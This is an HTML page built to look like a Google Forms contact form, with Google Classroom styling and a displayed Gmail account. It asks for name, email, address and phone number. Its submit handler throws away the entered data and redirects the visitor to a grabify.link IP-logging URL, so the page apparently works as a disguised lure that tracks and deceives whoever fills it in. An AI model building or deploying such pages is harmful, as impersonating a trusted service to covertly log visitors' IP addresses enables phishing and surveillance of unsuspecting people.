<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Contact Information</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Google Fonts: Roboto -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
  <style>
    body {
      background: #e7f1e7; /* Pale green background */
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      min-height: 100vh;
    }
    .header-img {
      width: 100%;
      height: 105px;
      background: #3bb146 url('https://www.gstatic.com/classroom/themes/img_reachout.jpg') center/cover no-repeat;
      border-radius: 8px 8px 0 0;
      margin-bottom: 0;
    }
    .form-container {
      background: #fff;
      max-width: 600px;
      margin: 48px auto;
      border-radius: 8px;
      box-shadow: 0 1px 8px 1px rgba(60,60,60,0.15);
      padding: 0 0 35px 0;
      overflow: hidden;
    }
    .form-content {
      padding: 0 36px;
    }
    .green-bar {
      height: 6px;
      width: 100%;
      background: #3bb146;
      margin-bottom: 0px;
    }
    .form-title {
      font-size: 2.1em;
      font-weight: 500;
      color: #222;
      margin-top: 22px;
      margin-bottom: 12px;
      letter-spacing: .01em;
    }
    .form-account {
      color: #757575;
      font-size: 1em;
      margin-bottom: 8px;
    }
    .form-desc {
      font-size: 1.1em;
      color: #d93025;
      margin-bottom: 25px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      color: #202124;
      margin-bottom: 7px;
      font-size: 1.13em;
      font-weight: 500;
      letter-spacing: .01em;
    }
    .form-required {
      color: #d93025;
      font-size: 1.1em;
      margin-left: 2px;
      font-weight: 700;
    }
    .form-input,
    .form-textarea {
      width: 100%;
      border: none;
      border-radius: 4px;
      font-size: 1.09em;
      padding: 13px 10px 10px 14px;
      outline: none;
      background: #f8fafc;
      transition: border .19s, box-shadow .19s;
      box-shadow: 0 1px 0 #dadce0;
      border: 1.5px solid #e0e0e0;
      font-family: inherit;
      resize: none;
      margin-bottom: 4px;
    }
    .form-input:focus,
    .form-textarea:focus {
      background: #fff;
      border: 2px solid #3bb146;
      box-shadow: 0 1px 2px #c7f0d7;
    }
    .form-textarea {
      min-height: 68px;
      resize: vertical;
    }
    .form-button {
      background: #3bb146;
      color: #fff;
      font-weight: 600;
      font-size: 1.09em;
      padding: 13px 44px;
      border: none;
      border-radius: 6px;
      box-shadow: 0 1px 4px rgba(100,160,100,.12);
      cursor: pointer;
      margin-top: 18px;
      transition: background 0.15s;
      letter-spacing: .02em;
    }
    .form-button:hover {
      background: #349b3f;
    }
    @media (max-width: 700px) {
      .form-container {
        max-width: 99vw;
        margin: 12px 0;
        border-radius: 0;
      }
      .form-content {
        padding: 0 10vw;
      }
    }
    @media (max-width: 500px) {
      .form-content {
        padding: 0 2vw;
      }
      .form-title {
        font-size: 1.23em;
      }
    }
  </style>
</head>
<body>
  <div class="form-container">
    <div class="header-img"></div>
    <div class="form-content">
      <div class="green-bar"></div>
      <div class="form-title">Contact information</div>
      <div class="form-account">optu1998@gmail.com</div>
      <div class="form-desc">* Indicates required question</div>
      <form id="infoForm">
        <div class="form-group">
          <label class="form-label" for="name">Name <span class="form-required">*</span></label>
          <input class="form-input" type="text" id="name" name="name" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="email">Email <span class="form-required">*</span></label>
          <input class="form-input" type="email" id="email" name="email" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="address">Address <span class="form-required">*</span></label>
          <input class="form-input" type="text" id="address" name="address" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="phone">Phone number</label>
          <input class="form-input" type="text" id="phone" name="phone">
        </div>
        <div class="form-group">
          <label class="form-label" for="comments">Comments</label>
          <textarea class="form-textarea" id="comments" name="comments"></textarea>
        </div>
        <button class="form-button" type="submit" onclick="submitAndRedirect(event)">
          Submit
        </button>
      </form>
    </div>
  </div>
  <script>
    function submitAndRedirect(e) {
      e.preventDefault(); // Prevent default form submission
      // Optionally, validate form here
      window.location.href = "https://grabify.link/16ZFC4";
    }
  </script>
</body>
</html>
